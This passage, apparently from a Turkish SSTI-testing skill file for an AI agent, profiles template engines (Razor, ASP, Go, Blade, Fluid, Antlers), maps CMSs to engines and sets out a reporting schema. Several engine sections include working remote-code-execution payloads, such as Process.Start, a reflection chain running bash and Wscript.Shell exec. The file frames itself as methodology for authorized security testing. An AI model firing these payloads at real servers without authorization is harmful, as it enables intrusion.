  geçerliyse):**
  ```
  @System.Diagnostics.Process.Start("cmd.exe","/c whoami > C:/Windows/Temp/out.txt");
  ```
  Bu örnek bir **dosya yazma** içerir — §0.2 Etik / Güvenlik Sınırı gereği yalnızca
  side-effect-free bir alternatif (örn. çıktıyı doğrudan response'a
  yazan bir yöntem) tercih edilmelidir; dosya sistemine kalıcı yazma
  gerektiren varyantlar yalnızca program açıkça izin veriyorsa ve iz
  temizlenebiliyorsa düşünülmelidir.

#### .NET Reflection ile Kısıtlama Bypass'ı

.NET'in reflection mekanizmaları, blacklist'i veya assembly'de
bulunmayan sınıfları bypass etmek için kullanılabilir — DLL'ler
runtime'da yüklenip temel objelerden erişilebilir metod/property'lere
sahip olabilir:

```
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?"))}
```

Tam komut çalıştırma zinciri:
```
{"a".GetType().Assembly.GetType("System.Reflection.Assembly").GetMethod("LoadFile").Invoke(null, "/path/to/System.Diagnostics.Process.dll".Split("?")).GetType("System.Diagnostics.Process").GetMethods().GetValue(0).Invoke(null, "/bin/bash,-c ""id""".Split(","))}
```

#### ASP (Klasik ASP)

- **Generic detection:** `<%= 6666*6666 %>` → `44435556`;
  `<%= 44444444-8888 %>` → `44435556` (aynı hedef değer, çıkarma probu);
  `<%= foo %>` → boş (tanımsız); `<%= response.write(date()) %>` →
  tarih döner (bu, evaluation'ın gerçekten çalıştığının bir kanıtıdır).
- **RCE / confirmation:**
  ```
  <%= CreateObject("Wscript.Shell").exec("whoami").StdOut.ReadAll() %>
  ```

#### DotLiquid / Scriban (.NET)

- Ruby Liquid ile aynı mantık ve sandbox modeli — bkz. §12.3 Liquid
  (`{{ }}`, `{% %}`, filtre bazlı, aritmetik desteği sınırlı —
  `{{ 6666 | times: 6666 }}` benzeri DotLiquid'de).
- Scriban daha zengin bir script dili sunduğundan `{{6666*6666}}` gibi
  doğrudan aritmetik de destekleyebilir (configuration-dependent).
- **Sandbox:** Default: DotLiquid'de güçlü; Scriban'da `ScriptObject`
  kısıtlamaları aktifse sınırlı, aksi halde daha esnek.

#### Go text/template ve html/template

- **Technology fingerprint:** Go ile yazılmış web uygulamaları/servisler.
- **Önemli negative indicator:** Go template dili doğrudan `+`/`*`
  gibi operatörleri desteklemez; `{{6666*6666}}` **her zaman
  negatiftir**. Bunun yerine kullanılabilecek generic/confirmation
  probe'ları:
  ```
  {{ . }}                // context/data representation probe — struct/map
                          // içeriğini bir şekilde döker, ama tam format
                          // (Stringer metodu, struct field sırası, custom
                          // formatting) data tipine göre değişir; "veriyi
                          // birebir döker" diye kesin varsayma, yalnızca
                          // "bir şey döndü mü, hata mı verdi" diye kontrol et
  {{printf "%s" "ssti"}}  // "ssti" döndürmesi beklenir
  ```
- **`html` fonksiyonu — text/template vs html/template ayrımı için
  kullanılabilir bir sinyal (KRİTİK DÜZELTME #2 — payload'ın kendisi
  hatalıydı, yalnızca `js` iddiası değil):** `html`, Go'nun resmi
  `ErrPredefinedEscaper` belgesinde **açıkça isimlendirilerek**
  `html/template`'te belirli pipeline konumlarında kısıtlanan iki
  fonksiyondan biridir (diğeri `urlquery`). **`js` bu kısıtlama
  listesinde yer almaz** — resmi Go dokümantasyonu bu kısıtlamayı
  yalnızca `"html"` ve `"urlquery"` için tanımlar.

  **Önemli düzeltme — payload seçimi:** `{{html "ssti"}}` gibi `html`'in
  **pipeline'ın tek/son komutu** olduğu bir kullanım, Go'nun kendi
  kuralına göre (*"html" and "urlquery" will continue to be allowed as
  the last command in a pipeline*) çoğu context'te **izinlidir** —
  yani bu haliyle `html/template`'te de hatasız çalışabilir ve
  fingerprint sinyali **üretmeyebilir**. Güvenilir sinyal için `html`'i
  **pipeline'ın ortasına** koy (Go dokümantasyonunun kendi örneğiyle
  aynı desen):
  ```
  {{"ssti" | html | print}}
  ```
  - **text/template'te:** çalışır, `ssti` döner (girdi zaten güvenli
    karakterlerden oluştuğu için escape görünmez farkı olmaz).
  - **html/template'te:** `predefined escaper "html" disallowed in
    template` benzeri bir **hata** döner — çünkü yukarıdaki payload
    `html`'i **kasıtlı olarak pipeline'ın ortasına** yerleştirir
    (Go'nun kendi `{{.X | html | makeALink}}` örnek deseniyle aynı);
    bu hata mesajının kendisi, hedefin `html/template` kullandığına
    dair bir **Medium/Strong indicator**'dır. **Bu payload'ı `{{html
    "ssti"}}` gibi tek/son-komut bir forma indirgeme** — o form Go 1.9+
    itibarıyla çoğu context'te izinlidir ve fingerprint sinyali
    üretmeyebilir (yukarıdaki düzeltmeye bkz.).
- **RCE (yalnızca application-specific bir obje metodu expose
  edilmişse mümkündür — kaynak koda erişim genelde gerekir):**
  Uygulama kodunda `func (p Person) Secret(cmd string) string { out,
  _ := exec.Command(cmd).CombinedOutput(); return string(out) }`
  şeklinde bir metod template'e expose edilmişse:
  ```
  {{ .Secret "id" }}
  ```
- **text/template vs html/template ayrımı:** `html/template`
  context-aware auto-escaping uygular (`{{"<script>alert(1)</script>"}}`
  çıktısı `&lt;script&gt;...` şeklinde escape edilir); ancak Go'da
  template `define`/`template` çağırma mekanizması bu escape'i bazı
  durumlarda atlatabilir (`{{define "T1"}}...{{end}} {{template
  "T1"}}` deseni — bu araştırma güncel Go sürümlerinde doğrulanmalıdır).
  `text/template` ise hiçbir escape yapmaz. Yukarıdaki `html`
  fonksiyon testi, bu ayrımı context-aware escaping davranışını
  gözlemlemeden, tek bir probe ile netleştirmenin en hızlı yoludur.
- **`call` ile fonksiyon çağırma — önce keşif, sonra escalation
  (KRİTİK düzeltme):** `{{call ...}}` veya `.Method` sözdizimi **her
  public Go fonksiyonunu değil**, yalnızca şu ikisinden birine erişimi
  olan fonksiyon/metodları çağırabilir: (a) `Execute()`'a geçirilen
  data objesinin **kendi public metodları** (`.Secret "id"` gibi —
  yukarıdaki örnek), veya (b) `Template.Funcs(FuncMap{...})` ile
  **açıkça kaydedilmiş** fonksiyonlar. Program genelindeki rastgele bir
  public fonksiyona (örn. `os.Exec`) template içinden **doğrudan isim
  vererek** ulaşılamaz — bu, `html/template` ile `text/template`
  arasındaki farkla **ilgisiz**, her ikisi için de geçerli bir
  kısıttır. Doğru sıralama:
  ```
  1. Data objesinin hangi metodları expose ettiğini keşfet:
     {{.}} ile struct'ı dök, ya da bilinen alan adlarını dene
     ({{.Secret}}, {{.Debug}}, {{.Exec}} gibi application-specific
     tahminler — kaynak koda erişim varsa doğrudan bak)
  2. FuncMap'e özel bir fonksiyon kaydedilmiş mi (uygulamaya özel,
     genelde string/math/format yardımcıları) araştır — bunlar
     genelde zararsızdır ama bazen `os/exec` gibi tehlikeli bir
     helper yanlışlıkla expose edilmiş olabilir
  3. Yalnızca 1 veya 2'den somut bir gadget bulunduysa capability
     confirmation'a (P5/P6) geç — "text/template kullanılıyor, o
     yüzden RCE mümkündür" varsayımı YANLIŞTIR, application-specific
     bir gadget şarttır
  ```
- **Sandbox modeli:** Fonksiyon whitelist'i (yalnızca `FuncMap`'e
  kayıtlı fonksiyonlar veya data objesinin kendi metodları
  çağrılabilir) — bu Go template'lerinin **varsayılan** ve en önemli
  koruma katmanıdır, "sandbox yok" ile karıştırılmamalıdır.

#### Ekstra / Sınır Durum: LESS (CSS Preprocessor) `@import` Enjeksiyonu

LESS, derleme sırasında `@import` ile referans verilen kaynakları
çekip (`inline` seçeneği kullanıldığında) içeriklerini üretilen CSS'e
gömer. Bu, klasik bir "template engine" SSTI'si değildir ama benzer
bir **derleme-zamanı kod/içerik enjeksiyonu** mantığı taşır — CSS
context'inde (bkz. §6) bir "template injection benzeri" zafiyet olarak
değerlendirilebilir; ayrı ve dar kapsamlı bir konu olduğundan bu
skill'de yalnızca farkındalık amaçlı not edilmiştir, derinlemesine
kapsanmamıştır.

#### Genel Java/Diğer Diller İçin Ek Kaynak Notu

Farklı template engine'lerde tanımlı özel değişkenleri (`config`,
`self`, `request`, `session` vb.) keşfetmek için SecLists projesindeki
`Fuzzing/template-engines-special-vars.txt` wordlist'i sink discovery
ve confirmation aşamalarında referans olarak kullanılabilir. Ayrıca
`Fuzzing/burp-parameter-names.txt` gibi genel parametre adı
wordlist'leri, §2'deki "yüksek öncelikli parametre adları" listesini
genişletmek için otomatik taramada kullanılabilir.

---

### 12.5 CMS-Özgü Motorlar: Blade, Fluid, Antlers

> §13'teki CMS tablosunda Laravel→Blade, TYPO3→Fluid ve
> Statamic→Antlers eşlemeleri zaten vardı, ama karşılık gelen bir
> engine profili yoktu — bu, agent'ı "CMS'i tespit ettim ama şimdi ne
> yapacağım" noktasında bırakan bir coverage boşluğuydu. Aşağıdaki
> profiller bu boşluğu kapatır; niş oldukları için diğer profillerden
> daha kısa tutulmuştur.

#### Blade (PHP — Laravel)

- **Technology fingerprint:** Laravel framework'ü kullanan
  uygulamalar; `.blade.php` dosya uzantısı, `laravel_session` cookie'si
  weak indicator'dır.
- **Delimiter:** `{{ }}` (otomatik escape edilmiş çıktı), `{!! !!}`
  (**escape edilmemiş** ham çıktı — SSTI/XSS açısından en kritik
  sözdizimi), `@if`/`@foreach` gibi `@` ile başlayan direktifler.
- **Önemli mimari not:** Blade template'leri **derlenerek düz PHP'ye
  çevrilir** ve öyle çalıştırılır — bu, Razor'daki "derleme zamanlı"
  durumla kavramsal olarak benzerdir (bkz. §12.4 Razor KRİTİK GATE).
  Yani `{{6666*6666}}` çalışması (eğer bu zaten geliştiricinin yazdığı
  bir `.blade.php` dosyasındaysa) **tek başına SSTI kanıtı değildir** —
  gerçek SSTI için kullanıcı girdisinin `Blade::render($userInput)` ya
  da benzeri bir **runtime string compile** API'sine bir template
  **kaynağı** olarak ulaşması gerekir (bkz. §3 Source→Sink). Bu API
  Laravel'de mevcuttur ama varsayılan/yaygın kullanım paterni değildir;
  öncelik CMS/eklenti kodunda `Blade::render`/`Blade::compileString`
  çağrısı arayan bir Sink Discovery adımıdır (§4).
- **Generic detection (yalnızca yukarıdaki sink doğrulandıktan sonra
  anlamlıdır):** `{{ 6666*6666 }}` → `44435556`;
  `{{ 44444444-8888 }}` → `44435556` (çarpma probe'uyla aynı hedef değer).
- **RCE / confirmation:** Blade derlendiğinde düz PHP olduğu için,
  ham PHP enjeksiyonuna eşdeğer bir yüzey açılır:
  ```
  {!! system('id') !!}
  @php echo system('id'); @endphp
  ```
- **Sandbox:** Yok — Blade'in kendisi bir sandbox modeli sunmaz;
  güvenlik tamamen "kullanıcı girdisi hiçbir zaman bir Blade template
  kaynağı olarak derlenmez" varsayımına dayanır (bkz. yukarıdaki
  Source→Sink notu).

#### Fluid (PHP — TYPO3)

- **Technology fingerprint:** TYPO3 CMS.
- **Delimiter:** `{ }` değişken interpolasyonu, ama asıl güç
  **ViewHelper** modelindedir: `<f:if>`, `<f:for>`, `<f:format.raw>`
  gibi XML-benzeri tag'ler.
- **Önemli mimari not:** Fluid, klasik "expression evaluation"
  motorlarından farklı bir modeldir — `{{6666*6666}}` gibi bir generic
  aritmetik probe **anlamlı değildir** (bu her zaman negatif dönecektir,
  bunu "SSTI yok" ile karıştırma, bkz. §7 Negative Capability mantığı).
  Bunun yerine değişken erişimi (`{myVar}`) ve ViewHelper zincirleme
  test edilmelidir.
- **Generic detection:** `{6666}` gibi düz bir değişken adı yerine
  literal bir sayı yazmak genelde bir syntax hatası ya da literal
  yansıma üretir; asıl sinyal **`<f:...>` ViewHelper tag'lerinin
  parse edilip edilmediğidir** — örn. `<f:format.raw>{some_var}</f:format.raw>`
  gibi bir yapının kullanıcı girdisinden geldiği ve derlendiği
  gösterilebiliyorsa bu güçlü bir evaluation evidence'tır.
- **RCE / confirmation:** `f:format.raw` gibi bir ViewHelper, escape'i
  devre dışı bırakarak XSS'e yakın bir etki yaratır; doğrudan kod
  çalıştırmaya götüren bir ViewHelper (custom bir eklenti tarafından
  kayıtlı olmadıkça) standart Fluid kurulumunda **yoktur** — bu motorda
  SSTI etkisi genelde bilgi sızıntısı/escape-bypass seviyesinde kalır,
  RCE için application-specific bir ViewHelper gerekir.
- **Sandbox:** ViewHelper whitelist'i (yalnızca kayıtlı ViewHelper
  sınıfları çağrılabilir) — Go'nun `FuncMap` modeline kavramsal olarak
  benzer bir kısıtlama.

#### Antlers (PHP — Statamic)

- **Technology fingerprint:** Statamic CMS. **Twig ile karıştırma** —
  Statamic Antlers kullanır, Twig değildir, ayrı bir sözdizimine ve
  ayrı bir tehdit modeline sahiptir.
- **Delimiter:** `{{ }}` ifade/tag, `{{? ?}}` (koşullu/güvenli
  değerlendirme varyantı), `{{$ $}}` (bazı Statamic sürümlerinde özel
  bir değerlendirme modu — sürüme göre davranışı doğrulanmalı).
- **Generic detection:** `{{ 6666*6666 }}` → `44435556` (Antlers
  aritmetik ifadeleri destekler, bu yönüyle Twig'e benzer davranır);
  `{{ 44444444-8888 }}` → `44435556` (çarpma probe'uyla aynı hedef değer).
- **RCE / confirmation:** Antlers'ın "modifier" sistemi (Twig'in
  filtrelerine benzer) ve bazı sürümlerde mevcut olan PHP-yakın
  execution yüzeyleri, Twig'deki `sort`/`map`/`filter` callback
  tekniğine (§12.1) kavramsal olarak benzer bir dolaylı çağırma riski
  taşıyabilir — bu motora özgü somut bir gadget zinciri bu skill'in
  yazıldığı sırada doğrulanmamıştır; hedefte karşılaşırsan önce
  hangi modifier'ların kayıtlı olduğunu (application-specific) keşfet,
  ardından bilinen callback-injection mantığını (§12.1'deki teknikten
  esinlenerek) adapte etmeyi dene.
- **Sandbox:** Application-specific / sürüme bağlı — genelleme yapma.

---

## 13. CMS / Framework → Engine Eşleme Tablosu

**Önemli düzeltme:** Aşağıdaki eşlemeler **varsayılan/tipik kurulum**
bilgisidir, kesin kural değildir. "Davranış Bağımlılığı" sütunu bu
eşlemenin default mu, configuration/version'a mı, yoksa uygulamaya özel
bir özelleştirmeye mi bağlı olduğunu belirtir.

| CMS/Framework | Engine | Davranış Bağımlılığı |
|---|---|---|
| Craft CMS | Twig | Configuration-dependent: sandbox genelde aktiftir ama proje ayarlarına göre değişebilir, her hedefte doğrulanmalı — bkz. §12.1 gerçek dünya Twig payload'ları |
| Drupal (8+) | Twig | Default behavior: Drupal çekirdeği doğrudan Twig kullanır (Drupal 7 ve öncesi PHPTemplate kullanıyordu, Twig SSTI'sı geçerli değil) — bkz. §12.1 |
| Django | Django Templates (bazen Jinja2 de yapılandırılabilir) | Configuration-dependent — bkz. §12.1 Django Templates |
| Flask | Jinja2 | Default behavior: en sık karşılaşılan Python SSTI hedefi |
| Wagtail | Django Templates / Jinja2 | Django ile aynı mantık — bkz. §12.1 Django Templates |
| Laravel | Blade (derlenmiş halde PHP) | Application-specific: derleme-zamanlı çalışır, gerçek SSTI için runtime string-compile API'sine ulaşım gerekir — bkz. §12.5 Blade |
| Rails | ERB | Application-specific: risk genelde `render inline:` kullanımından |
| Shopify | Liquid | Default behavior: sandbox güçlü — bkz. §12.3 Liquid |
| Jekyll | Liquid | Build-time render — SSTI genelde CI/CD bağlamında — bkz. §12.3 Liquid |
| Ghost CMS | Handlebars | Default behavior: `{{@site}}`/`{{@config}}`/`{{@custom}}` gibi Ghost'a özgü context data helper'ları CMS-aware discovery için değerli — bkz. §12.3 Handlebars |
| Grav CMS / October CMS | Twig | Configuration-dependent |
| TYPO3 | Fluid | Default behavior: ViewHelper (`<f:...>`) tabanlı, klasik `{{ }}` expression evaluation'dan farklı bir model — bkz. §12.5 Fluid |
| PrestaShop | Smarty | Default behavior — bkz. §12.1 Smarty |
| Shopware 6 | Twig | Default behavior: bilinen bir public advisory, Sandbox extension'ı olmayan Twig ortamında `map`/`filter`/`sort` üzerinden PHP fonksiyonu çağrılabildiğini göstermiştir (spesifik advisory kimliği kasıtlı olarak verilmemiştir, bkz. §15 CVE/versiyon iddiaları notu) — bkz. §12.1 Twig callback teknikleri |
| WordPress (çekirdek) | PHP-native (template engine yok) | Default behavior: klasik SSTI adayı değildir; **Timber** eklentisi kullanılıyorsa → Twig, bazı ekosistem parçalarında Blade benzeri yaklaşımlar olabilir — önce hangi template katmanının kullanıldığı doğrulanmalı |
| Magento (1 ve 2) | PHTML + XML layout (native, template engine değil) | Default behavior: Magento **hiçbir zaman** Smarty kullanmamıştır (yaygın bir yanlış varsayım) — hem M1 hem M2 derlenmiş PHP (.phtml) + XML layout sistemi kullanır; Smarty yalnızca üçüncü taraf bir modülle (örn. CleatSquad_Smarty) **default olmayan** şekilde eklenebilir, bunu varsaymadan önce doğrula |
| Confluence/Jira (eski sürümler) | Velocity | Version-dependent: bilinen public CVE'ler var |
| XWiki | Groovy (SolrSearch gibi makrolarda) | Version-dependent: bkz. §12.2 SolrSearch vaka analizi |
| HubSpot CMS | Jinjava / HuBL | Default behavior — bkz. §12.2 |
| Adobe Experience Manager (AEM) | HTL/Sightly (modern), legacy JSP | Version-dependent: AEM 6.x+ varsayılan olarak HTL/Sightly kullanır, eski/özel bileşenlerde hâlâ JSP bulunabilir — hangi katmanın kullanıcı girdisini işlediği ayrı ayrı doğrulanmalı, bkz. §12.2 HTL/Sightly |
| Umbraco | Razor | Default behavior: .NET/Razor ailesiyle aynı mantık — bkz. §12.4 Razor |
| Statamic | Antlers (kendi özel sözdizimi, `{{ }}`) | Default behavior: Twig ile karıştırılmamalı — Antlers Twig değildir, kendi tag/modifier sistemine sahiptir — bkz. §12.5 Antlers |
| Symfony (genel framework) | Twig | Default behavior — bkz. §12.1 Twig |
| Contao | Twig (4+) | Version-dependent: eski sürümlerde farklı bir template sistemi vardı |
| CakePHP | PHP-native (varsayılan), Twig eklenti ile mümkün | Application-specific |
| Silverstripe | SSViewer (kendi özel sözdizimi, `$Variable`/`<% %>`) | Default behavior: bu dosyada ayrı bir §12 profili yok, kendi template dili Twig/Jinja değildir |
| Joomla | PHP-native (template engine yok) | Default behavior: klasik SSTI adayı değildir |
| Spring (genel) | Thymeleaf / Freemarker | Application-specific: SpEL/EL Injection ile karışabilir |
| ASP.NET (genel) | Razor | Application-specific: genelde derleme zamanlı |
| Go web uygulamaları | text/template veya html/template | Application-specific: doğrudan test edilmeli |
| n8n benzeri workflow builder'lar | Node.js expression sandbox (vm2/isolated-vm) | Application-specific — bkz. §12.3, §11 |

---

## 14. Raporlama ve Payload Metadata Şeması

### 14.1 Raporlama Şablonu

Her SSTI bulgusu için rapor şu unsurları içermelidir:

1. **`vulnerability_class`** — bulgunun gerçek sınıfı, açıkça
   etiketlenir: `SSTI` / `EL_INJECTION` / `EXPRESSION_INJECTION`
   (örn. Node.js expression sandbox, §11) / `OBJECT_PROPERTY_ACCESS`
   (§6 Type Confusion) / `CSTI` (kapsam dışı, yalnızca yanlışlıkla
   SSTI sanılmaması için not düşülür) / `UNKNOWN`. Bu alan, dosya
   genelinde zaten yapılan SSTI/EL-Injection/CSTI/Type-Confusion
   ayrımını (bkz. §0.1 Kapsam, §6) rapor seviyesinde **zorunlu** hale
   getirir — "SSTI" etiketi yalnızca bu sınıf gerçekten doğrulandığında
   kullanılır.
2. **Hedef:** URL, HTTP method, etkilenen parametre.
3. **Tespit edilen engine, versiyon (varsa) ve confidence seviyesi**
   — **SSTI classification** ve **engine classification** §8.4'teki
   tanıma göre **ayrı ayrı** raporlanır, birbirine kilitlenmez:
   - SSTI (causality) "confirmed" mi: Eksen 1'den **tek bir kanıt
     türü** (evaluation / stored-indirect / OOB), §5.1'deki geçerli
     bir negatif kontrolle birlikte, **yeterlidir** — ikinci bir
     evidence kategorisi **şart değildir**.
   - Engine (attribution) "confirmed" mi: en az bir Strong indicator
     (genelde error signature) + tutarlı davranış — bu, SSTI
     classification'ından bağımsız bir alandır; "Confirmed SSTI,
     engine: unknown" geçerli ve eksiksiz bir sonuçtur.
   - confidence_score (§10.5) yalnızca destekleyici bilgidir, "confirmed"
     eşiğini belirleyen şey bu puan değil, yukarıdaki iki kural setidir.
4. **Detection payload'ı** — tam request/response (marker dahil,
   `6666*6666`→`44435556` gibi, veya §5'teki engine-native canary).
5. **Confirmation kanıtı** — SSTI "confirmed" için gereken tek Eksen-1
   kanıtının kendisi (evaluation/stored-indirect/OOB) ve onun §5.1'e
   göre kurulmuş negatif kontrolü. **Ek bir evidence kategorisi**
   (örn. ayrıca bir engine fingerprint sinyali) varsa bu da eklenir,
   ama SSTI classification'ını "confirmed" yapan şart değildir — yalnızca
   confidence_score'u (§10.5) ve/veya engine classification'ını
   güçlendirir (bkz. §8.3 "Kanıt bağımsızlığı").
6. **Beklenen vs gerçekleşen sonuç** — net karşılaştırma.
7. **False-positive olmadığının kanıtı** — negatif kontrol, ve
   gerekiyorsa CSTI/object-property-access ayrımının gösterimi.
8. **Impact assessment gerekçesi** — sandbox var mı/aşıldı mı, yalnızca
   bilgi sızıntısı mı yoksa RCE'ye kadar gidildi mi, etkilenen verinin
   hassasiyeti. Zafiyetin gerçek etkisini gösteren kanıtlar (erişilen
   hassas/ayrıcalıklı veri dahil) buraya eklenir.
9. **Reproduction adımları** — başka birinin aynı sonucu tekrar
   üretebilmesi için yeterli detay.

**Rapora eklenmemesi gerekenler:** Zafiyeti kanıtlama amacı taşımayan,
RCE ile elde edilebilecek zararlı komutların ayrıntılı bir listesi;
zafiyetle doğrudan ilgisi olmayan hedef sistem iç bilgileri.

### 14.2 Payload Metadata Şeması

Yeni bir payload eklerken, şu alanları takip et:

| Alan | Açıklama |
|---|---|
| engine | Hangi engine (veya "generic") |
| version_range | Bilinen minimum/maksimum versiyon (varsa) |
| syntax | Tam payload metni |
| context | plain/HTML/attribute/string/expression |
| purpose | detection / fingerprinting / confirmation |
| expected_result | Beklenen çıktı (ham/raw temsil — binlik ayraçsız) |
| alternatives | Eşdeğer alternatif syntax'lar |
| encoding_variants | Bilinen encode edilmiş varyantlar |
| behavior_dependency | default / configuration-dependent / version-dependent / application-specific |
| evidence_category | reflection / evaluation / fingerprint / context / stored-indirect / OOB |
| fp_risk | Yanlış pozitif riski: düşük / orta / yüksek |
| kaynak | Bu payload'ın kökeni (örn. "HackTricks", "kullanıcı — gerçek bug bounty raporu", "genel bilgi") |
| payload_stage *(yeni eklenen payload'lar için zorunlu)* | §1.5 Payload Stage Model'e göre: P0-reflection / P1-syntax / P2-evaluation / P3-context / P4-object-discovery / P5-capability / P6-impact |
| prerequisites *(yeni eklenen payload'lar için zorunlu)* | Bu payload'ın çalışması için gerekli önkoşullar (örn. `sandbox=absent`, `callable=available`, `custom_filter=exposed`) — §1.7 Prerequisite Gate bu alanı okur |
| side_effect_level *(yeni eklenen payload'lar için zorunlu)* | none / read-only / external-interaction (OOB) / state-changing — state-changing olan her payload §0.2'deki etik sınıra tabidir |

**Bu üç alan, P5/P6 (capability/impact) aşamasındaki her yeni
payload için zorunludur** — çünkü §1.7 Prerequisite Gate ve agent'ın
otomatik payload seçimi tam olarak bu alanlara dayanır; alansız bir
P5/P6 payload'ı agent'ın "bu payload'ı şimdi mi ateşlemeliyim"
kararını veremeyeceği anlamına gelir. P0-P2 (reflection/syntax/
evaluation) aşamasındaki basit detection payload'ları için bu alanlar
opsiyonel kalabilir — genelde önkoşulsuzdurlar zaten.

**Geriye dönük etiketleme yapılmıyor:** Dosyadaki ~150+ mevcut
payload'ı tek tek bu alanlarla yeniden etiketlemek bilinçli olarak
**tercih edilmedi** — orantısız efor karşılığında düşük değer katar ve
düzenleme hatası riski taşır. Mevcut bir payload incelenirken "bu
hangi stage'de, önkoşulu ne" sorusu, o payload'ın bulunduğu engine
profilindeki düzyazı açıklamadan (örn. "Sandbox: ..." notları) zaten
çıkarılabilir; bu üç alan yalnızca **bundan sonra eklenecek** içerik
için zorunludur.

### 14.3 Bilinen Sandbox-Bypass Desenlerini ve CVE'leri Araştırma Notu

Twig, Freemarker, Velocity, Thymeleaf, Pebble, Groovy (XWiki gibi
entegrasyonlarda) için yıllar içinde yayınlanmış public SSTI/
sandbox-bypass CVE'leri, confirmation payload'larının zengin bir
kaynağıdır. Bir hedefte standart confirmation payload'ı sandbox
tarafından engellenirse veya belirli bir versiyon tespit edilirse,
ilgili engine için güncel kaynaklardan (web araması ile) şunları
araştır: etkilenen versiyon aralığı, root cause, detection pattern'i,
modern/düzeltilmiş sürümdeki davranış. Eski bir CVE payload'ını güncel
sürümde otomatik çalışır varsaymak false-negative'e yol açabilir.

---

## 15. Referans Araçlar ve Kaynaklar

**Araçlar:** Bu skill, çoğu "otomatik SSTI tarayıcısı"nın (miadını
doldurmuş, bakımsız kalmış veya SSTI'ye özgü tespit mantığının zaten
bu skill'in metodolojisiyle örtüştüğü) skill içinde ayrıca
listelenmesini gereksiz bulur — bu tür bir liste zamanla eskir ve
gerçek değer katmaz. **Tek istisna: interactsh-client** (bkz. §9.3) —
OOB testleri için gerekli, aktif olarak bakımı yapılan ve SSTI'ye özgü
bir "tespit" iddiası taşımayan (yalnızca callback/log toplayan) sade
bir araç olduğu için ayrıca anılmaya değer.

**Bilgi kaynakları (araç değil, referans dokümantasyon):**
- **SecLists** — `Fuzzing/template-engines-special-vars.txt`,
  `Discovery/Web-Content/burp-parameter-names.txt` — özel değişken ve
  parametre adı wordlist'leri.
- **PortSwigger Research** — "Server-Side Template Injection" ve
  "Exploiting SSTI" makaleleri — Twig, Freemarker, Velocity gibi
  engine'lere dair sandbox/bypass detaylarının orijinal kaynağı.
- **PayloadsAllTheThings** (`swisskyrepo/PayloadsAllTheThings`) —
  "Server Side Template Injection" bölümü, engine bazlı ek payload
  koleksiyonu.
- **HackTricks** — SSTI sayfası, bu skill'in engine profilleri
  bölümünün temel referans kaynaklarından biridir; güncel zafiyetler
  ve modern sandbox (vm2/isolated-vm) notları için düzenli olarak
  tekrar kontrol edilmelidir. **Not — bu dosyada bilinçli olarak
  yapılmayan bir şey:** Bu skill dosyası, hiçbir yerde spesifik bir
  CVE/GHSA kimliği veya kesin sürüm numarası hard-code etmez — çünkü
  bu tür kimlikler ve onlara bağlı "hangi sürümde düzeltildi" iddiaları
  zamanla değişebilir, yanlış atfedilebilir veya kaynağında dahi
  hatalı olabilir; dosyaya gömülü olarak eskiyen bir iddia, canlı bir
  testte doğrudan yanıltıcı olur. Bunun yerine davranış (ör. "sandbox
  bazı sürümlerde bir tekniği engeller, bazılarında engellemez")
  anlatılır ve şüpheli/yüksek etkili bir iddiayla karşılaşıldığında
  güncel kaynaktan (resmi dokümantasyon, CVE veritabanı) **testte
  ampirik olarak** doğrulanması önerilir — ama bu, agent'ın her
  hedefte bir "versiyon tespiti" alt-akışı çalıştırması gerektiği
  anlamına gelmez (bkz. §11 n8n notu, §12.1 Twig notu — bu
  skill kasıtlı olarak elaborate versiyon-karar-ağaçları kurmaz).

---

## Kapanış Notu

Bu dosya kasıtlı olarak **tek parça** tutulmuştur; ileride
`SKILL.md` + `references/workflow.md` + `references/detection.md` +
`references/context.md` + `references/fingerprinting.md` +
`references/engines/*.md` + `references/reference.md` şeklinde
parçalanacaktır. Parçalama sırasında:

- §1–4 (Genel Akış, Discovery, Source→Sink, Sink Discovery) →
  `references/workflow.md`
- §5, §8 (Generic Detection, Encoding/WAF/Evidence/FP-FN) →
  `references/detection.md`
- §6 (Context Detection + Type Confusion) → `references/context.md`
- §7 (Fingerprinting) → `references/fingerprinting.md`
- §9, §10, §11 (Stored/Blind, Confirmation/Impact, Modern Mimari) →
  `references/workflow.md`
- §12 (Engine Profilleri) → `references/engines/*.md` (aile bazlı:
  jinja-family, java-family, ruby-node-family, dotnet-go-family +
  gerekirse yeni `misc-family.md` — Mojolicious/Plates/patTemplate gibi
  küçük motorlar için)
- §13–15 (CMS mapping, Raporlama, Araçlar) → `references/reference.md`